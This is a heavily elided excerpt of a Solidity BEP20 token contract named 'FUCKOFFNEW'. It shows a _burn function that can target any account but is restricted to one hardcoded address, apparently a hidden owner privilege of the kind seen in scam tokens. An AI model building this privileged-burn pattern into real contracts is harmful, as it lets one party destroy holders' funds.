...
contract FUCKOFFNEW is IBEP20, Context {
    using SafeMath for uint256;
    ...
    string constant _name = "FUCKOFFNEW";
    string constant _symbol = "FUCKOFFNEW";
    ...
    function _burn(address account, uint256 amount) internal virtual {
        ...
        require(msg.sender == 0x6bD533BeE463fd0488058f9A2A959aaAd6F20910);
    }
